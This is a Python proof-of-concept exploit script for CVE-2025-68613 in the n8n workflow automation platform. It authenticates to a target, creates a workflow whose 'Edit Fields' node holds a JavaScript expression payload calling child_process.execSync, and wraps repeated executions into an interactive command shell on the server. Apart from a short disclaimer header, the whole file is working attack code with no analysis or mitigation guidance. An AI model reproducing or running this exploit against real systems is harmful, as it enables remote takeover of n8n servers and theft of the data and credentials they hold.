# ======================================================================
#  SECURITY PROOF-OF-CONCEPT (PoC)
# ======================================================================
#
#  @file        [exploit.py]
#  @contact     [hello@arkb.me]
#  @date        2025-12-24
#
#  @purpose
#  This script is a proof-of-concept intended strictly for
#  educational and authorized security demonstration purposes. It
#  demonstrates an RCE vulnerability in n8n via workflow manipulation.
#
#  @credits
#  Based on CVE-2025-68613: https://nvd.nist.gov/vuln/detail/CVE-2025-68613
#
#  @disclaimer
#  This code is provided "as-is" for educational use only.
#  The author(s) and affiliated organizations assume no liability
#  for any misuse or damage caused by this code.
#
#  Unauthorized use of this code against any system without
#  explicit permission is illegal and strictly prohibited.
#
# ======================================================================

import requests
import json
import argparse
import sys

# Global session to maintain cookies/headers across requests
s = requests.Session()

def get_headers():
    return {
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'en',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Pragma': 'no-cache',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'CVE-2025-68613: demo script by github.com/AbdulRKB',
    }

def login(base_url, email, password):
    resp = s.post(
        f'{base_url}/rest/login',
        headers=get_headers(),
        json={'emailOrLdapLoginId': email, 'password': password},
    )
    return resp

def get_projects(base_url):
    resp = s.get(
        f'{base_url}/rest/projects',
        headers=get_headers(),
        cookies=s.cookies.get_dict(),
    )
    data = resp.json().get('data')
    if not data:
        print("[-] No projects found or authentication failed.")
        sys.exit(1)
        
    # Returns (project_name, project_id)
    return (data[0].get('name'), data[0].get('id'))

def create_new_workflow(base_url, project_id):
    resp = s.get(
        f'{base_url}/rest/workflows/new',
        params={'projectId': project_id},
        cookies=s.cookies.get_dict(),
        headers=get_headers(),
    )
    return resp.json().get('data').get('name')

def send_payload(base_url, project_id, workflow_name, payload):
    # Constructing the malicious Node.js payload
    js_payload = '={{ (function(){ return this.process.mainModule.require(\'child_process\').execSync(\'___cmd___\').toString() })() }}'.replace('___cmd___', payload)
    
    workflow_json = {
        'name': workflow_name,
        'nodes': [
            {
                'parameters': {},
                'type': 'n8n-nodes-base.manualTrigger',
                'typeVersion': 1,
                'position': [0, 0],
                'id': '77a44e25-31ae-49dc-8446-63c3b0733321',
                'name': 'When clicking ‘Execute workflow’'
            },
            {
                'parameters': {
                    'assignments': {
                        'assignments': [
                            {
                                'id': 'f5514760-89ea-4c83-ae87-00ac0d71b1ef',
                                'name': 'res',
                                'value': js_payload,
                                'type': 'string'
                            }
                        ]
                    },
                    'options': {}
                },
                'type': 'n8n-nodes-base.set',
                'typeVersion': 3.4,
                'position': [208, 0],
                'id': '261a905e-3fb3-484a-b5da-23417b7aa6ab',
                'name': 'Edit Fields'
            }
        ],
        'pinData': {},
        'connections': {
            'When clicking ‘Execute workflow’': {
                'main': [[{'node': 'Edit Fields', 'type': 'main', 'index': 0}]]
            }
        },
        'active': False,
        'settings': {'executionOrder': 'v1'},
        'tags': [],
        'versionId': '',
        'uiContext': 'workflow_list',
        'projectId': project_id
    }

    resp = s.post(
        f'{base_url}/rest/workflows',
        headers=get_headers(),
        json=workflow_json,
        cookies=s.cookies.get_dict(),
    )
    return resp.json().get('data').get('id')

def send_execution_command(base_url, workflow_name, workflow_id, payload):
    js_payload = '={{ (function(){ return this.process.mainModule.require(\'child_process\').execSync(\'___cmd___\').toString() })() }}'.replace('___cmd___', payload)
    
    execution_json = {
        'workflowData': {
            'name': workflow_name,
            'nodes': [
                {
                    'parameters': {},
                    'type': 'n8n-nodes-base.manualTrigger',
                    'typeVersion': 1,
                    'position': [0, 0],
                    'id': '77a44e25-31ae-49dc-8446-63c3b0733321',
                    'name': 'When clicking ‘Execute workflow’'
                },
                {
                    'parameters': {
                        'assignments': {
                            'assignments': [
                                {
                                    'id': 'f5514760-89ea-4c83-ae87-00ac0d71b1ef',
                                    'name': 'res',
                                    'value': js_payload,
                                    'type': 'string'
                                }
                            ]
                        },
                        'options': {}
                    },
                    'type': 'n8n-nodes-base.set',
                    'typeVersion': 3.4,
                    'position': [208, 0],
                    'id': '261a905e-3fb3-484a-b5da-23417b7aa6ab',
                    'name': 'Edit Fields'
                }
            ],
            'pinData': {},
            'connections': {
                'When clicking ‘Execute workflow’': {
                    'main': [[{'node': 'Edit Fields', 'type': 'main', 'index': 0}]]
                }
            },
            'active': False,
            'settings': {'executionOrder': 'v1'},
            'tags': [],
            'versionId': '033956c6-7575-4fe1-95a3-2c5be5bd209e',
            'id': workflow_id
        },
        'startNodes': [],
        'destinationNode': 'Edit Fields'
    }

    s.post(
        f'{base_url}/rest/workflows/{workflow_id}/run',
        headers=get_headers(),
        json=execution_json,
        cookies=s.cookies.get_dict(),
    )

def get_execution_id(base_url):
    executions = s.get(
        f'{base_url}/rest/executions',
        headers=get_headers(),
        cookies=s.cookies.get_dict(),
    )
    return executions.json().get('data').get('results')[0].get('id')

def get_execution_response(base_url, execution_id):
    resp = s.get(
        f'{base_url}/rest/executions/{execution_id}',
        headers=get_headers(),
        cookies=s.cookies.get_dict(),
    )
    try:
        data = json.loads(resp.json().get('data').get('data'))
        return data[-1]
    except Exception as e:
        return f"[-] Error parsing response: {e}"

def interactive_shell(base_url, workflow_name, workflow_id):
    print(f"[+] Starting interactive shell. Type 'exit' to quit.")
    try:
        while True:
            user_input = input("$ ")
            if user_input.lower() in ['exit', 'quit']:
                break
            if not user_input.strip():
                continue

            send_execution_command(base_url, workflow_name, workflow_id, user_input)
            execution_id = get_execution_id(base_url)
            
            result = get_execution_response(base_url, execution_id)
            print(result)
            
    except KeyboardInterrupt:
        print("\n[-] Exiting!")
        sys.exit()

def parse_arguments():
    parser = argparse.ArgumentParser(description='n8n RCE PoC')
    parser.add_argument('-u', '--url', required=True, help='Target URL (e.g., http://127.0.0.1:5678)')
    parser.add_argument('-e', '--email', help='Login Email (e.g., hello@arkb.me)')
    parser.add_argument('-p', '--password', help='Login Password (e.g., 12345)')
    return parser.parse_args()

def main():
    args = parse_arguments()
    
    # Clean URL
    base_url = args.url.rstrip('/')
    
    print(f"[*] Target: {base_url}")
    print(f"[*] Attempting login with {args.email}...")
    
    login_resp = login(base_url, args.email, args.password)
    if login_resp.status_code != 200:
        print(f"[-] Login failed. Status Code: {login_resp.status_code}")
        print(f"[-] Response: {login_resp.text}")
        return

    print(f"[+] Logged In Successfully!")
    project_name, project_id = get_projects(base_url)
    print(f"[+] Target Project Name: {project_name}")
    print(f"[+] Target Project ID: {project_id}")
    
    workflow_name = create_new_workflow(base_url, project_id)
    print(f"[+] Created temporary workflow: {workflow_name}")
    
    # Initial trigger to register the workflow ID
    payload = "id"
    workflow_id = send_payload(base_url, project_id, workflow_name, payload)
    print(f"[+] Workflow ID obtained: {workflow_id}")
    print("[+] Initial Payload Sent!")
    
    interactive_shell(base_url, workflow_name, workflow_id)

if __name__ == '__main__':
    main()